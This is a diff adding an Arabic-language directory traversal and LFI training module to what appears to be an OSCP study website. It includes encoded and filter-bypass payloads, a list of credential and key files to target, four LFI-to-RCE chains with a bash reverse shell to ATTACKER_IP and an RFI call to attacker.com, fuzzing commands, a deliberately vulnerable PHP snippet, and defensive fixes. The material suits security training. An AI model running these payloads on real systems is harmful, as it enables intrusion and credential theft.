@@ -734,6 +734,9 @@
           <span>▼</span>
         </div>
         <div class="category-items" id="cat-oscp" style="display: none;">
+          <div class="meth-item" id="meth-ef-dir_traversal" onclick="openMethPhase('dir_traversal')" data-search="directory traversal path traversal lfi local file inclusion dot dot slash ../  etc passwd bypass filter encoding">
+            <span>├── 📁</span> <span>Directory Traversal Deep Dive</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'dir_traversal', '📁 Directory Traversal')">★</button>
+          </div>
           <div class="meth-item" id="meth-ef-oscp_bof" onclick="openMethPhase('oscp_bof')" data-search="buffer overflow bof exploit development immunity mona">
             <span>├── 💥</span> <span>Buffer Overflow (25 Pts)</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oscp_bof', '💥 Buffer Overflow')">★</button>
           </div>
@@ -7703,6 +7706,394 @@ Content-Type: application/json
           <p><strong>التأثير (Impact):</strong> القدرة على تنفيذ هجمات Phishing موثوقة وسرقة ملفات تعريف الارتباط للمستخدمين (Cookies Session Hijacking) وتشويه الموقع.</p>
           <p><strong>المكافأة المتوقعة (Bounty):</strong> <span class="text-neon-green">$1,000 - $2,500</span></p>
         </div>
+      </div>
+
+      <!-- ══════════════════════════════════════════════════════════
+           MODULE: Directory Traversal / Path Traversal — Deep Dive
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-dir_traversal" style="display: none; --tool-color: #f97316;">
+        <div class="phase-module-header">
+          <div class="icon-wrapper">📁</div>
+          <div class="header-text">
+            <h2>Directory Traversal / Path Traversal — الدليل الكامل</h2>
+            <p>هجوم يُمكّن المهاجم من الوصول لملفات وأدلة خارج مجلد الـ Web Root الخاص بالخادم باستخدام تسلسل <code>../</code> للتنقل في نظام الملفات.</p>
+          </div>
+        </div>
+
+        <!-- ━━━ WHAT IS IT ━━━ -->
+        <div class="cyber-card" style="border-left: 4px solid #f97316;">
+          <div class="card-header"><h3>🧠 ما هو Directory Traversal؟ (المفهوم من الصفر)</h3></div>
+          <p>عندما يقبل تطبيق ويب مدخلاً من المستخدم ويستخدمه لتحديد مسار ملف على الخادم — دون التحقق من هذا المسار — يُمكن للمهاجم توجيه الخادم للقراءة من أي مكان في نظام الملفات.</p>
+
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:15px 0;">
+            <div style="background:#0d1117;padding:15px;border-radius:8px;border:1px solid rgba(249,115,22,0.3);">
+              <div style="color:#f97316;font-weight:bold;margin-bottom:8px;">🌐 مثال الكود الضعيف (PHP)</div>
+              <div style="font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.7;">
+                <div style="color:#94a3b8;">&lt;?php</div>
+                <div>$file = $_GET[<span style="color:#00e5ff;">'page'</span>];</div>
+                <div style="color:#ff3366;">include("/var/www/html/" . $file);</div>
+                <div style="color:#94a3b8;">// ⚠️ لا يوجد أي فلترة!</div>
+                <div style="color:#94a3b8;">?&gt;</div>
+              </div>
+            </div>
+            <div style="background:#0d1117;padding:15px;border-radius:8px;border:1px solid rgba(0,255,102,0.3);">
+              <div style="color:#00ff66;font-weight:bold;margin-bottom:8px;">✅ الكود الآمن (PHP)</div>
+              <div style="font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.7;">
+                <div style="color:#94a3b8;">&lt;?php</div>
+                <div>$allowed = ['home','about','contact'];</div>
+                <div>$file = basename($_GET['page']);</div>
+                <div style="color:#00ff66;">if(in_array($file, $allowed)) {</div>
+                <div style="color:#00ff66;">&nbsp;&nbsp;include("/var/www/html/" . $file);</div>
+                <div style="color:#00ff66;">}</div>
+                <div style="color:#94a3b8;">?&gt;</div>
+              </div>
+            </div>
+          </div>
+
+          <div style="background:#090d16;padding:15px;border-radius:8px;border:1px solid rgba(249,115,22,0.2);margin-top:10px;">
+            <div style="color:#f97316;font-weight:bold;margin-bottom:10px;">🗺️ كيف يعمل الهجوم — رسم بياني مفصّل</div>
+            <div style="font-family:monospace;font-size:0.83rem;color:#e2e8f0;line-height:2;">
+              <div style="color:#94a3b8;">URL الطبيعي:</div>
+              <div>https://target.com/view.php?page=<span style="color:#00e5ff;">home.html</span></div>
+              <div style="color:#94a3b8;margin-top:8px;">→ الخادم يقرأ: /var/www/html/<span style="color:#00e5ff;">home.html</span> ✅</div>
+              <div style="color:#94a3b8;margin-top:12px;">URL الهجوم:</div>
+              <div>https://target.com/view.php?page=<span style="color:#ff3366;">../../../etc/passwd</span></div>
+              <div style="color:#94a3b8;margin-top:8px;">→ الخادم يقرأ:</div>
+              <div>/var/www/html/ + <span style="color:#ff3366;">../../../etc/passwd</span></div>
+              <div>= /var/www/<span style="color:#ff3366;">../</span> = /var/<span style="color:#ff3366;">../</span> = /<span style="color:#ff3366;">../</span> → لا يوجد مستوى أعلى!</div>
+              <div>= <span style="color:#ff3366;">/etc/passwd</span> ← كشف ملف حساس! 💀</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ━━━ PAYLOADS TABLE ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>💉 جدول Payloads الكامل — من الأبسط للأكثر تعقيداً</h3></div>
+          <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:0.82rem;">
+              <thead>
+                <tr style="background:#0d1117;border-bottom:2px solid #f97316;">
+                  <th style="padding:10px;text-align:left;color:#f97316;">المستوى</th>
+                  <th style="padding:10px;text-align:left;color:#f97316;">الـ Payload</th>
+                  <th style="padding:10px;text-align:left;color:#f97316;">الهدف</th>
+                  <th style="padding:10px;text-align:left;color:#f97316;">ملاحظة</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#00ff66;font-size:0.75rem;background:rgba(0,255,102,0.1);padding:2px 6px;border-radius:3px;">Basic</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#00e5ff;">../../../etc/passwd</td>
+                  <td style="padding:8px;color:#e2e8f0;">Linux user list</td>
+                  <td style="padding:8px;color:#94a3b8;">أبسط محاولة</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#00ff66;font-size:0.75rem;background:rgba(0,255,102,0.1);padding:2px 6px;border-radius:3px;">Basic</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#00e5ff;">..\..\..\windows\win.ini</td>
+                  <td style="padding:8px;color:#e2e8f0;">Windows system file</td>
+                  <td style="padding:8px;color:#94a3b8;">للخوادم Windows</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#eab308;font-size:0.75rem;background:rgba(234,179,8,0.1);padding:2px 6px;border-radius:3px;">Encoded</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#eab308;">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</td>
+                  <td style="padding:8px;color:#e2e8f0;">URL Encoded</td>
+                  <td style="padding:8px;color:#94a3b8;">يتجاوز فلترة النص البسيط</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#eab308;font-size:0.75rem;background:rgba(234,179,8,0.1);padding:2px 6px;border-radius:3px;">Encoded</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#eab308;">..%2f..%2f..%2fetc%2fpasswd</td>
+                  <td style="padding:8px;color:#e2e8f0;">Partial URL Encode</td>
+                  <td style="padding:8px;color:#94a3b8;">فقط الـ / مشفرة</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#eab308;font-size:0.75rem;background:rgba(234,179,8,0.1);padding:2px 6px;border-radius:3px;">Encoded</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#eab308;">%252e%252e%252fetc%252fpasswd</td>
+                  <td style="padding:8px;color:#e2e8f0;">Double URL Encoded</td>
+                  <td style="padding:8px;color:#94a3b8;">يتجاوز WAF يفك URL مرة</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#ff9a56;font-size:0.75rem;background:rgba(255,154,86,0.1);padding:2px 6px;border-radius:3px;">Bypass</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#ff9a56;">....//....//....//etc/passwd</td>
+                  <td style="padding:8px;color:#e2e8f0;">Filter Bypass</td>
+                  <td style="padding:8px;color:#94a3b8;">بعد حذف ../ يبقى ../</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#ff9a56;font-size:0.75rem;background:rgba(255,154,86,0.1);padding:2px 6px;border-radius:3px;">Bypass</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#ff9a56;">..././..././..././etc/passwd</td>
+                  <td style="padding:8px;color:#e2e8f0;">Filter Bypass v2</td>
+                  <td style="padding:8px;color:#94a3b8;">Nested sequences</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#ff9a56;font-size:0.75rem;background:rgba(255,154,86,0.1);padding:2px 6px;border-radius:3px;">Bypass</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#ff9a56;">/var/www/html/../../../etc/passwd</td>
+                  <td style="padding:8px;color:#e2e8f0;">Absolute Path Bypass</td>
+                  <td style="padding:8px;color:#94a3b8;">لما الكود يضيف prefix</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#ff3366;font-size:0.75rem;background:rgba(255,51,102,0.1);padding:2px 6px;border-radius:3px;">Advanced</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#ff3366;">%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</td>
+                  <td style="padding:8px;color:#e2e8f0;">Unicode Overlong</td>
+                  <td style="padding:8px;color:#94a3b8;">Java/old IIS servers</td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:8px;"><span style="color:#ff3366;font-size:0.75rem;background:rgba(255,51,102,0.1);padding:2px 6px;border-radius:3px;">Advanced</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#ff3366;">....\\....\\....\\etc\\passwd</td>
+                  <td style="padding:8px;color:#e2e8f0;">Mixed Slashes</td>
+                  <td style="padding:8px;color:#94a3b8;">يخلط Windows/Linux slashes</td>
+                </tr>
+                <tr>
+                  <td style="padding:8px;"><span style="color:#a855f7;font-size:0.75rem;background:rgba(168,85,247,0.1);padding:2px 6px;border-radius:3px;">LFI→RCE</span></td>
+                  <td style="padding:8px;font-family:monospace;color:#a855f7;">../../../var/log/apache2/access.log</td>
+                  <td style="padding:8px;color:#e2e8f0;">Log Poisoning → RCE</td>
+                  <td style="padding:8px;color:#94a3b8;">الأكثر خطورة 💀</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- ━━━ HIGH VALUE FILES ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>🎯 الملفات الأعلى قيمة (High-Value Targets)</h3></div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;">
+            <div>
+              <div style="color:#f97316;font-weight:bold;margin-bottom:10px;">🐧 Linux / Unix</div>
+              <div style="display:flex;flex-direction:column;gap:6px;">
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#ff3366;">/etc/passwd</span> <span style="color:#94a3b8;">← قائمة المستخدمين</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#ff3366;">/etc/shadow</span> <span style="color:#94a3b8;">← هاشات كلمات المرور</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#ff3366;">/etc/hosts</span> <span style="color:#94a3b8;">← خريطة الشبكة الداخلية</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#ff3366;">/proc/self/environ</span> <span style="color:#94a3b8;">← متغيرات البيئة (LFI→RCE)</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#ff3366;">/proc/self/cmdline</span> <span style="color:#94a3b8;">← سطر الأوامر الحالي</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#eab308;">/var/log/apache2/access.log</span> <span style="color:#94a3b8;">← Log Poisoning</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#eab308;">/var/log/nginx/access.log</span> <span style="color:#94a3b8;">← Nginx logs</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#a855f7;">/var/mail/www-data</span> <span style="color:#94a3b8;">← SSH keys احياناً</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#a855f7;">~/.ssh/id_rsa</span> <span style="color:#94a3b8;">← Private SSH Key 🔑</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#a855f7;">/var/www/html/config.php</span> <span style="color:#94a3b8;">← DB credentials</span>
+                </div>
+              </div>
+            </div>
+            <div>
+              <div style="color:#00a8ff;font-weight:bold;margin-bottom:10px;">🪟 Windows</div>
+              <div style="display:flex;flex-direction:column;gap:6px;">
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#ff3366;">C:\Windows\win.ini</span> <span style="color:#94a3b8;">← Confirm Traversal</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#ff3366;">C:\Windows\System32\drivers\etc\hosts</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#ff3366;">C:\Windows\repair\SAM</span> <span style="color:#94a3b8;">← Password hashes!</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#eab308;">C:\inetpub\logs\LogFiles\</span> <span style="color:#94a3b8;">← IIS logs</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#eab308;">C:\Users\[user]\.ssh\id_rsa</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#a855f7;">C:\inetpub\wwwroot\web.config</span> <span style="color:#94a3b8;">← DB creds</span>
+                </div>
+                <div style="background:#090d16;padding:8px;border-radius:4px;font-family:monospace;font-size:0.8rem;">
+                  <span style="color:#a855f7;">C:\Windows\System32\config\SYSTEM</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ━━━ LFI TO RCE CHAIN ━━━ -->
+        <div class="cyber-card" style="border:1px solid rgba(255,51,102,0.3);background:rgba(255,51,102,0.02);">
+          <div class="card-header"><h3 style="color:#ff3366;">💀 LFI → RCE : سلاسل الترقية الكاملة (4 طرق)</h3></div>
+
+          <div style="margin-bottom:20px;">
+            <div style="color:#ff9a56;font-weight:bold;margin-bottom:8px;">🔥 Method 1: Log Poisoning (الأكثر شيوعاً)</div>
+            <div style="background:#090d16;padding:12px;border-radius:6px;border-left:3px solid #ff9a56;font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;"># Step 1: تسميم User-Agent بكود PHP</div>
+              <div>curl -A <span style="color:#ff3366;">"&lt;?php system(\$_GET['cmd']); ?&gt;"</span> https://target.com/</div>
+              <div style="color:#94a3b8;margin-top:6px;"># Step 2: تشغيل الكود عبر LFI</div>
+              <div>https://target.com/view.php?page=<span style="color:#eab308;">../../../var/log/apache2/access.log</span>&amp;<span style="color:#00e5ff;">cmd=id</span></div>
+              <div style="color:#94a3b8;margin-top:6px;"># النتيجة:</div>
+              <div style="color:#00ff66;">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+              <div style="color:#94a3b8;margin-top:6px;"># Step 3: Reverse Shell</div>
+              <div>cmd=bash+-c+'bash+-i+&gt;&amp;+/dev/tcp/<span style="color:#ff3366;">ATTACKER_IP</span>/4444+0&gt;&amp;1'</div>
+            </div>
+          </div>
+
+          <div style="margin-bottom:20px;">
+            <div style="color:#a855f7;font-weight:bold;margin-bottom:8px;">🔥 Method 2: /proc/self/environ Poisoning</div>
+            <div style="background:#090d16;padding:12px;border-radius:6px;border-left:3px solid #a855f7;font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;"># تسميم User-Agent نفس الأسلوب</div>
+              <div>curl -A <span style="color:#ff3366;">"&lt;?php system(\$_GET['x']); ?&gt;"</span> https://target.com/</div>
+              <div style="color:#94a3b8;margin-top:6px;"># قراءة proc/self/environ (يحتوي User-Agent كـ HTTP_USER_AGENT)</div>
+              <div>?page=<span style="color:#a855f7;">../../../proc/self/environ</span>&amp;x=whoami</div>
+              <div style="color:#94a3b8;margin-top:4px;"># هذا يعمل لأن الملف يحتوي متغيرات البيئة مباشرة</div>
+            </div>
+          </div>
+
+          <div style="margin-bottom:20px;">
+            <div style="color:#00e5ff;font-weight:bold;margin-bottom:8px;">🔥 Method 3: PHP Session File Poisoning</div>
+            <div style="background:#090d16;padding:12px;border-radius:6px;border-left:3px solid #00e5ff;font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;"># Step 1: ابحث عن Session parameter وأدخل PHP code فيه</div>
+              <div>POST /login.php</div>
+              <div>username=<span style="color:#ff3366;">&lt;?php system($_GET['x']); ?&gt;</span>&amp;password=test</div>
+              <div style="color:#94a3b8;margin-top:6px;"># Step 2: احصل على PHPSESSID من الـ Cookie</div>
+              <div>Cookie: PHPSESSID=<span style="color:#eab308;">abc123xyz</span></div>
+              <div style="color:#94a3b8;margin-top:6px;"># Step 3: اقرأ ملف الـ Session عبر LFI</div>
+              <div>?page=<span style="color:#00e5ff;">../../../tmp/sess_abc123xyz</span>&amp;x=id</div>
+              <div style="color:#94a3b8;"># ملفات السيشن في: /tmp/sess_[PHPSESSID] أو /var/lib/php/sessions/</div>
+            </div>
+          </div>
+
+          <div>
+            <div style="color:#00ff66;font-weight:bold;margin-bottom:8px;">🔥 Method 4: PHP Wrappers (بدون أي Log Access!)</div>
+            <div style="background:#090d16;padding:12px;border-radius:6px;border-left:3px solid #00ff66;font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;"># قراءة source code مباشرة (Base64 encoded)</div>
+              <div>?page=<span style="color:#00ff66;">php://filter/convert.base64-encode/resource=index.php</span></div>
+              <div style="color:#94a3b8;margin-top:6px;"># فك تشفير الناتج:</div>
+              <div>echo "ENCODED_BASE64" | base64 -d</div>
+              <div style="color:#94a3b8;margin-top:10px;"># RCE مباشر عبر data:// wrapper</div>
+              <div>?page=<span style="color:#ff3366;">data://text/plain,&lt;?php system('id'); ?&gt;</span></div>
+              <div style="color:#94a3b8;margin-top:6px;"># أو عبر expect:// (لو مفعّل)</div>
+              <div>?page=<span style="color:#ff3366;">expect://id</span></div>
+              <div style="color:#94a3b8;margin-top:6px;"># RCE عبر input://</div>
+              <div>?page=<span style="color:#ff3366;">php://input</span></div>
+              <div>POST body: <span style="color:#ff3366;">&lt;?php system('id'); ?&gt;</span></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ━━━ TOOLS & AUTOMATION ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ الأدوات والأوامر السريعة</h3></div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;">
+            <div style="background:#0d1117;padding:15px;border-radius:8px;">
+              <div style="color:#f97316;font-weight:bold;margin-bottom:10px;">🔍 Manual Testing مع Burp</div>
+              <div style="font-family:monospace;font-size:0.8rem;color:#e2e8f0;line-height:1.8;">
+                <div style="color:#94a3b8;"># في Burp Intruder، استخدم هذه القائمة</div>
+                <div style="color:#00e5ff;">../../../etc/passwd</div>
+                <div style="color:#00e5ff;">....//....//....//etc/passwd</div>
+                <div style="color:#00e5ff;">%2e%2e%2f%2e%2e%2fetc%2fpasswd</div>
+                <div style="color:#00e5ff;">%252e%252e%252fetc%252fpasswd</div>
+                <div style="color:#00e5ff;">..%2f..%2f..%2fetc%2fpasswd</div>
+              </div>
+            </div>
+            <div style="background:#0d1117;padding:15px;border-radius:8px;">
+              <div style="color:#00ff66;font-weight:bold;margin-bottom:10px;">⚡ Automated — dotdotpwn</div>
+              <div style="font-family:monospace;font-size:0.8rem;color:#e2e8f0;line-height:1.8;">
+                <div style="color:#94a3b8;"># أداة متخصصة لاكتشاف Path Traversal</div>
+                <div>dotdotpwn -m http -h target.com \</div>
+                <div>&nbsp;&nbsp;-u "http://target.com/view.php?page=TRAVERSAL" \</div>
+                <div>&nbsp;&nbsp;-f "/etc/passwd" -d 6 -b</div>
+                <div style="color:#94a3b8;margin-top:6px;"># مع ffuf:</div>
+                <div>ffuf -u "https://target.com/view.php?page=FUZZ" \</div>
+                <div>&nbsp;&nbsp;-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \</div>
+                <div>&nbsp;&nbsp;-mr "root:x:0:0"</div>
+              </div>
+            </div>
+          </div>
+          <div style="background:#090d16;padding:15px;border-radius:8px;margin-top:15px;border-left:3px solid #a855f7;">
+            <div style="color:#a855f7;font-weight:bold;margin-bottom:10px;">🚀 الـ Wordlists الأفضل من SecLists</div>
+            <div style="font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div><span style="color:#00e5ff;">SecLists/Fuzzing/LFI/LFI-Jhaddix.txt</span> — أشمل قائمة LFI</div>
+              <div><span style="color:#00e5ff;">SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</span> — Linux files</div>
+              <div><span style="color:#00e5ff;">SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</span> — Windows files</div>
+              <div><span style="color:#00e5ff;">SecLists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt</span> — شامل جداً</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ━━━ DIFFERENCE ━━━ -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚖️ الفرق بين LFI و RFI و Path Traversal</h3></div>
+          <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
+              <thead>
+                <tr style="background:#0d1117;border-bottom:2px solid #f97316;">
+                  <th style="padding:10px;text-align:left;color:#f97316;">النوع</th>
+                  <th style="padding:10px;text-align:left;color:#f97316;">الوصف</th>
+                  <th style="padding:10px;text-align:left;color:#f97316;">مثال</th>
+                  <th style="padding:10px;text-align:left;color:#f97316;">الخطورة</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:10px;"><strong style="color:#eab308;">Path Traversal</strong></td>
+                  <td style="padding:10px;color:#e2e8f0;">قراءة ملفات فقط خارج الـ Web Root</td>
+                  <td style="padding:10px;font-family:monospace;font-size:0.78rem;color:#00e5ff;">?file=../../../etc/passwd</td>
+                  <td style="padding:10px;"><span style="color:#eab308;">High</span></td>
+                </tr>
+                <tr style="border-bottom:1px solid #1e293b;">
+                  <td style="padding:10px;"><strong style="color:#ff9a56;">LFI</strong></td>
+                  <td style="padding:10px;color:#e2e8f0;">تضمين وتنفيذ ملف محلي موجود على الخادم</td>
+                  <td style="padding:10px;font-family:monospace;font-size:0.78rem;color:#ff9a56;">?page=../../../var/log/access.log</td>
+                  <td style="padding:10px;"><span style="color:#ff9a56;">Critical</span></td>
+                </tr>
+                <tr>
+                  <td style="padding:10px;"><strong style="color:#ff3366;">RFI</strong></td>
+                  <td style="padding:10px;color:#e2e8f0;">تضمين وتنفيذ ملف من خادم خارجي (URL)</td>
+                  <td style="padding:10px;font-family:monospace;font-size:0.78rem;color:#ff3366;">?page=http://attacker.com/shell.txt</td>
+                  <td style="padding:10px;"><span style="color:#ff3366;">Critical (Direct RCE)</span></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- ━━━ DEFENSES ━━━ -->
+        <div class="cyber-card" style="border:1px solid rgba(0,255,102,0.2);background:rgba(0,255,102,0.02);">
+          <div class="card-header"><h3 style="color:#00ff66;">🛡️ الحماية والإصلاح الشامل</h3></div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;">
+            <div>
+              <div style="font-weight:bold;color:#00ff66;margin-bottom:8px;">✅ الحلول التقنية</div>
+              <ul style="color:#e2e8f0;font-size:0.85rem;line-height:2;padding-left:15px;">
+                <li>استخدام <code>realpath()</code> أو <code>Path.resolve()</code> للتحقق من المسار الفعلي</li>
+                <li>مقارنة المسار الناتج بـ Allowed Base Directory</li>
+                <li>استخدام Whitelist للملفات المسموح بها فقط</li>
+                <li>تعطيل <code>allow_url_include</code> في PHP</li>
+                <li>تشغيل الخادم بصلاحيات أدنى (Principle of Least Privilege)</li>
+                <li>تفعيل <code>open_basedir</code> في PHP لحصر القراءة</li>
+              </ul>
+            </div>
+            <div>
+              <div style="font-weight:bold;color:#00ff66;margin-bottom:8px;">🔒 مثال Secure Code (PHP)</div>
+              <div style="font-family:monospace;font-size:0.8rem;color:#e2e8f0;line-height:1.8;background:#090d16;padding:12px;border-radius:6px;">
+                <div>&lt;?php</div>
+                <div>$base = realpath('/var/www/html/files/');</div>
+                <div>$file = realpath($base . '/' . $_GET['f']);</div>
+                <div>&nbsp;</div>
+                <div style="color:#00ff66;">if ($file && strpos($file, $base) === 0) {</div>
+                <div style="color:#00ff66;">&nbsp;&nbsp;echo file_get_contents($file);</div>
+                <div style="color:#00ff66;">} else {</div>
+                <div style="color:#ff3366;">&nbsp;&nbsp;http_response_code(403);</div>
+                <div style="color:#00ff66;">}</div>
+                <div>?&gt;</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- MARK COMPLETE -->
+        <button class="mark-complete-btn" id="complete-btn-dir_traversal" onclick="markPhaseComplete('dir_traversal','oscp_bof')">
+          ✅ Mark Complete — Directory Traversal Mastered → Proceed to Buffer Overflow
+        </button>
       </div>
 
       <!-- OSCP: Buffer Overflow -->
